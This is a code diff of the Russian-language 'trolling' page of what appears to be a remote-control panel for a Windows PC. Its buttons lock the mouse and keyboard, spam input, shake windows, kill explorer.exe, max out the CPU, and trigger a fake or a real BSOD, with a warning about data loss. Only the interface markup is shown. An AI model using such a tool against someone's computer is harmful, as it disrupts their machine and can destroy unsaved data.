@@ -365,131 +365,281 @@
   </div><!-- /page-files -->
 
   <!-- ══ ТРОЛЛИНГ ══ -->
-  <div class="page" id="page-troll">
+<div class="page" id="page-troll">
 
-    <div class="slabel">Дисплей</div>
-    <div class="troll-section">
-      <button class="troll-card warn" onclick="execCmd('monitor_off')">
-        <div class="troll-card-icon">🖥</div>
-        <div class="troll-card-label">Выкл. монитор</div>
-      </button>
-      <button class="troll-card ok" onclick="execCmd('monitor_on')">
-        <div class="troll-card-icon">🖥</div>
-        <div class="troll-card-label">Вкл. монитор</div>
-      </button>
-    </div>
+  <!-- ═══════════════════════════════════════
+       ДИСПЛЕЙ / ЭКРАН
+  ═══════════════════════════════════════ -->
+  <div class="slabel">🖥 Дисплей / Экран</div>
+  <div class="troll-section">
+    <button class="troll-card blue" onclick="openRotateScreen()">
+      <div class="troll-card-icon">🔄</div>
+      <div class="troll-card-label">Повернуть экран</div>
+    </button>
+    
+    <button class="troll-card accent" onclick="mirrorScreen()">
+      <div class="troll-card-icon">🪞</div>
+      <div class="troll-card-label">Зеркальное отражение</div>
+    </button>
+    
+    <button class="troll-card warn" onclick="execCmd('monitor_off')">
+      <div class="troll-card-icon">🖥</div>
+      <div class="troll-card-label">Выкл. монитор</div>
+    </button>
+    
+    <button class="troll-card ok" onclick="execCmd('monitor_on')">
+      <div class="troll-card-icon">🖥</div>
+      <div class="troll-card-label">Вкл. монитор</div>
+    </button>
+  </div>
 
-    <div class="slabel">Блокировка устройств</div>
-    <div class="troll-section">
-      <button class="troll-toggle-card" id="btnMouse" onclick="trollToggle('mouse')">
-        <div class="ttc-header">
-          <span class="ttc-icon">🖱</span>
-          <span class="ttc-badge off" id="badgeMouse">ВЫКЛ</span>
-        </div>
-        <div class="ttc-label" id="lblMouse">Блокировка мыши</div>
-      </button>
-      <button class="troll-toggle-card" id="btnKb" onclick="trollToggle('keyboard')">
-        <div class="ttc-header">
-          <span class="ttc-icon">⌨️</span>
-          <span class="ttc-badge off" id="badgeKb">ВЫКЛ</span>
-        </div>
-        <div class="ttc-label" id="lblKb">Блокировка клавиатуры</div>
-      </button>
-    </div>
+  <!-- Переключатели дисплея -->
+  <div class="troll-section">
+    <button class="troll-toggle-card" id="btnInvertColors" onclick="toggleInvertColors()">
+      <div class="ttc-header">
+        <span class="ttc-icon">🌈</span>
+        <span class="ttc-badge off" id="badgeInvertColors">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblInvertColors">Инверсия цветов</div>
+    </button>
+    
+    <button class="troll-toggle-card" id="btnBrightnessFlash" onclick="toggleBrightnessFlash()">
+      <div class="ttc-header">
+        <span class="ttc-icon">💡</span>
+        <span class="ttc-badge off" id="badgeBrightnessFlash">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblBrightnessFlash">Мигание яркостью</div>
+    </button>
+  </div>
 
-    <div class="slabel">Хаос</div>
-    <div class="troll-section">
-      <button class="troll-toggle-card" id="btnCrazy" onclick="trollToggle('crazy')">
-        <div class="ttc-header">
-          <span class="ttc-icon">🎲</span>
-          <span class="ttc-badge off" id="badgeCrazy">ВЫКЛ</span>
-        </div>
-        <div class="ttc-label" id="lblCrazy">Сумасшедшая мышь</div>
-      </button>
-      <button class="troll-card accent" onclick="openSpamMenu()">
-        <div class="troll-card-icon">📢</div>
-        <div class="troll-card-label">Спам клавишами</div>
-      </button>
-    </div>
+  <!-- ═══════════════════════════════════════
+       МЫШЬ
+  ═══════════════════════════════════════ -->
+  <div class="slabel">🖱 Мышь</div>
+  <div class="troll-section">
+    <button class="troll-toggle-card" id="btnMouse" onclick="trollToggle('mouse')">
+      <div class="ttc-header">
+        <span class="ttc-icon">🖱</span>
+        <span class="ttc-badge off" id="badgeMouse">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblMouse">Блокировка мыши</div>
+    </button>
+    
+    <button class="troll-toggle-card" id="btnInvertMouseButtons" onclick="toggleInvertMouseButtons()">
+      <div class="ttc-header">
+        <span class="ttc-icon">🔁</span>
+        <span class="ttc-badge off" id="badgeInvertMouseButtons">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblInvertMouseButtons">Инверсия ЛКМ↔ПКМ</div>
+    </button>
+    
+    <button class="troll-toggle-card" id="btnGiantCursor" onclick="toggleGiantCursor()">
+      <div class="ttc-header">
+        <span class="ttc-icon">👆</span>
+        <span class="ttc-badge off" id="badgeGiantCursor">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblGiantCursor">Гигантский курсор</div>
+    </button>
+    
+    <button class="troll-toggle-card" id="btnCrazy" onclick="trollToggle('crazy')">
+      <div class="ttc-header">
+        <span class="ttc-icon">🎲</span>
+        <span class="ttc-badge off" id="badgeCrazy">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblCrazy">Сумасшедшая мышь</div>
+    </button>
+  </div>
 
-    <div class="slabel">Скролл атаки</div>
-    <div class="troll-section">
-      <button class="troll-card blue" onclick="scrollAttack('up')">
-        <div class="troll-card-icon">⬆️</div>
-        <div class="troll-card-label">Скролл вверх × 20</div>
-      </button>
-      <button class="troll-card blue" onclick="scrollAttack('down')">
-        <div class="troll-card-icon">⬇️</div>
-        <div class="troll-card-label">Скролл вниз × 20</div>
-      </button>
-    </div>
+  <!-- ═══════════════════════════════════════
+       КЛАВИАТУРА
+  ═══════════════════════════════════════ -->
+  <div class="slabel">⌨️ Клавиатура</div>
+  <div class="troll-section">
+    <button class="troll-toggle-card" id="btnKb" onclick="trollToggle('keyboard')">
+      <div class="ttc-header">
+        <span class="ttc-icon">⌨️</span>
+        <span class="ttc-badge off" id="badgeKb">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblKb">Блокировка клавиатуры</div>
+    </button>
+    
+    <button class="troll-toggle-card" id="btnGameKeys" onclick="toggleGameKeys()">
+      <div class="ttc-header">
+        <span class="ttc-icon">🎮</span>
+        <span class="ttc-badge off" id="badgeGameKeys">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblGameKeys">Инверсия игровых клавиш</div>
+    </button>
+  </div>
 
-    <div class="slabel">Кликомания</div>
-    <div class="troll-section">
-      <button class="troll-card accent" onclick="clickSpam('left')">
-        <div class="troll-card-icon">🖱</div>
-        <div class="troll-card-label">ЛКМ × 50</div>
-      </button>
-      <button class="troll-card accent" onclick="clickSpam('right')">
-        <div class="troll-card-icon">🖱</div>
-        <div class="troll-card-label">ПКМ × 50</div>
-      </button>
-    </div>
+  <div class="troll-section">
+    <button class="troll-card accent" onclick="openSpamMenu()">
+      <div class="troll-card-icon">📢</div>
+      <div class="troll-card-label">Спам клавишами</div>
+    </button>
+  </div>
 
-    <div class="slabel">Звуковой террор</div>
-    <div class="troll-section">
-      <button class="troll-card warn" onclick="volumeChaos()">
-        <div class="troll-card-icon">🔊</div>
-        <div class="troll-card-label">Хаос громкости</div>
-      </button>
-      <button class="troll-card warn" onclick="muteChaos()">
-        <div class="troll-card-icon">🔇</div>
-        <div class="troll-card-label">Мигание Mute</div>
-      </button>
-    </div>
+  <!-- ═══════════════════════════════════════
+       ОКНА
+  ═══════════════════════════════════════ -->
+  <div class="slabel">🪟 Окна</div>
+  <div class="troll-section">
+    <button class="troll-toggle-card" id="btnWindowShake" onclick="toggleWindowShake()">
+      <div class="ttc-header">
+        <span class="ttc-icon">📳</span>
+        <span class="ttc-badge off" id="badgeWindowShake">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblWindowShake">Тряска окон</div>
+    </button>
+    
+    <button class="troll-card blue" onclick="openMultiWindows()">
+      <div class="troll-card-icon">🪟</div>
+      <div class="troll-card-label">Открыть 10 окон</div>
+    </button>
+    
+    <button class="troll-card warn" onclick="minimizeAllWindows()">
+      <div class="troll-card-icon">📉</div>
+      <div class="troll-card-label">Свернуть всё</div>
+    </button>
+    
+    <button class="troll-card accent" onclick="openCmdWindows()">
+      <div class="troll-card-icon">⌨️</div>
+      <div class="troll-card-label">CMD окна</div>
+    </button>
+  </div>
 
-    <div class="slabel">Окна</div>
-    <div class="troll-section">
-      <button class="troll-card blue" onclick="openMultiWindows()">
-        <div class="troll-card-icon">🪟</div>
-        <div class="troll-card-label">Открыть 10 окон</div>
-      </button>
-      <button class="troll-card warn" onclick="minimizeAllWindows()">
-        <div class="troll-card-icon">📉</div>
-        <div class="troll-card-label">Свернуть всё</div>
-      </button>
-    </div>
+  <!-- ═══════════════════════════════════════
+       ЗВУК
+  ═══════════════════════════════════════ -->
+  <div class="slabel">🔊 Звук</div>
+  <div class="troll-section">
+    <button class="troll-toggle-card" id="btnRandomSounds" onclick="toggleRandomSounds()">
+      <div class="ttc-header">
+        <span class="ttc-icon">🔔</span>
+        <span class="ttc-badge off" id="badgeRandomSounds">ВЫКЛ</span>
+      </div>
+      <div class="ttc-label" id="lblRandomSounds">Случайные звуки</div>
+    </button>
+    
+    <button class="troll-card accent" onclick="openSpeakText()">
+      <div class="troll-card-icon">🔊</div>
+      <div class="troll-card-label">Озвучка текста</div>
+    </button>
+    
+    <button class="troll-card warn" onclick="volumeChaos()">
+      <div class="troll-card-icon">🔊</div>
+      <div class="troll-card-label">Хаос громкости</div>
+    </button>
+    
+    <button class="troll-card warn" onclick="muteChaos()">
+      <div class="troll-card-icon">🔇</div>
+      <div class="troll-card-label">Мигание Mute</div>
+    </button>
+  </div>
 
-    <!-- Fake BSOD -->
-    <div class="slabel">Fake BSOD</div>
-    <div class="troll-section">
-      <button class="troll-card warn" onclick="fakeBsod('win10')">
-        <div class="troll-card-icon">💙</div>
-        <div class="troll-card-label">Win10 стиль</div>
-      </button>
-      <button class="troll-card blue" onclick="fakeBsod('win11')">
-        <div class="troll-card-icon">🔵</div>
-        <div class="troll-card-label">Win11 стиль</div>
-      </button>
-    </div>
+  <!-- ═══════════════════════════════════════
+       ИНТЕРНЕТ
+  ═══════════════════════════════════════ -->
+  <div class="slabel">🌐 Интернет</div>
+  <div class="troll-section">
+    <button class="troll-card blue" onclick="openTabsMenu()">
+      <div class="troll-card-icon">🌐</div>
+      <div class="troll-card-label">Открыть N вкладок</div>
+    </button>
+  </div>
 
-    <div class="slabel">⚠️ Экстрим</div>
-    <div class="troll-section single">
-      <button class="troll-card-full danger"
-        onclick="confirmAction('bsod','BSOD? Все несохранённые данные будут потеряны!')">
-        <div class="tcf-icon">💀</div>
-        <div class="tcf-label">Настоящий BSOD</div>
-        <div class="tcf-hint">Принудительный крэш системы</div>
-      </button>
-    </div>
+  <!-- ═══════════════════════════════════════
+       АТАКИ
+  ═══════════════════════════════════════ -->
+  <div class="slabel">⚔️ Атаки</div>
+  <div class="troll-section">
+    <button class="troll-card blue" onclick="scrollAttack('up')">
+      <div class="troll-card-icon">⬆️</div>
+      <div class="troll-card-label">Скролл вверх × 20</div>
+    </button>
+    
+    <button class="troll-card blue" onclick="scrollAttack('down')">
+      <div class="troll-card-icon">⬇️</div>
+      <div class="troll-card-label">Скролл вниз × 20</div>
+    </button>
+    
+    <button class="troll-card accent" onclick="clickSpam('left')">
+      <div class="troll-card-icon">🖱</div>
+      <div class="troll-card-label">ЛКМ × 50</div>
+    </button>
+    
+    <button class="troll-card accent" onclick="clickSpam('right')">
+      <div class="troll-card-icon">🖱</div>
+      <div class="troll-card-label">ПКМ × 50</div>
+    </button>
+  </div>
 
-    <div class="troll-warning">
-      ⚠️ Некоторые функции могут привести к потере данных
-    </div>
+  <!-- ═══════════════════════════════════════
+       СПЕЦЭФФЕКТЫ
+  ═══════════════════════════════════════ -->
+  <div class="slabel">✨ Спецэффекты</div>
+  <div class="troll-section">
+    <button class="troll-card ok" onclick="matrixMode()">
+      <div class="troll-card-icon">🟢</div>
+      <div class="troll-card-label">Матрица режим</div>
+    </button>
+    
+    <button class="troll-card blue" onclick="screenshotWallpaper()">
+      <div class="troll-card-icon">🖼</div>
+      <div class="troll-card-label">Фейковый рабочий стол</div>
+    </button>
+  </div>
 
-  </div><!-- /page-troll -->
+  <!-- ═══════════════════════════════════════
+       FAKE BSOD
+  ═══════════════════════════════════════ -->
+  <div class="slabel">💙 Fake BSOD</div>
+  <div class="troll-section">
+    <button class="troll-card warn" onclick="fakeBsod('win10')">
+      <div class="troll-card-icon">💙</div>
+      <div class="troll-card-label">Win10 стиль</div>
+    </button>
+    
+    <button class="troll-card blue" onclick="fakeBsod('win11')">
+      <div class="troll-card-icon">🔵</div>
+      <div class="troll-card-label">Win11 стиль</div>
+    </button>
+  </div>
 
-</div><!-- /pages -->
+  <!-- ═══════════════════════════════════════
+       ЭКСТРИМ (ОПАСНО)
+  ═══════════════════════════════════════ -->
+  <div class="slabel">⚠️ Экстрим (опасно)</div>
+  
+  <div class="troll-section">
+    <button class="troll-card warn" onclick="killExplorer()">
+      <div class="troll-card-icon">💀</div>
+      <div class="troll-card-label">Убить explorer.exe</div>
+    </button>
+    
+    <button class="troll-card danger" onclick="openCpuLoad()">
+      <div class="troll-card-icon">🔥</div>
+      <div class="troll-card-label">Загрузка CPU 100%</div>
+    </button>
+  </div>
+
+  <div class="troll-section single">
+    <button class="troll-card-full danger"
+      onclick="confirmAction('bsod','BSOD? Все несохранённые данные будут потеряны!')">
+      <div class="tcf-icon">💀</div>
+      <div class="tcf-label">Настоящий BSOD</div>
+      <div class="tcf-hint">Принудительный крэш системы</div>
+    </button>
+  </div>
+
+  <!-- ═══════════════════════════════════════
+       ПРЕДУПРЕЖДЕНИЕ
+  ═══════════════════════════════════════ -->
+  <div class="troll-warning">
+    ⚠️ Некоторые функции могут привести к потере данных или зависанию ПК
+  </div>
+
+</div><!-- /page-troll -->
 
 <!-- ══ TABS ══ -->
 <div class="tabs">
